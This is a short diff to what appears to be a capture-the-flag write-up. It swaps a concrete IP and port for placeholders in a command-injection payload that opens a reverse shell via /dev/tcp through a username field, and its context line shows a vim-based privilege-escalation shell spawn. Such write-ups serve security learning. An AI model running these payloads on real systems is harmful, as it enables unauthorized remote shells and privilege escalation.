@@ -39,7 +39,9 @@ vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
 
 ### subdirectory - `betatest`
 
-`tdurden;bash -i >& /dev/tcp/10.8.91.66/8888 0>&1`
+`tdurden;bash -i >& /dev/tcp/<ip>/<port> 0>&1`
+
+![image](images/betatest.png)
 
 > Same Priv-Esc as of narrator using vim <br/>
 
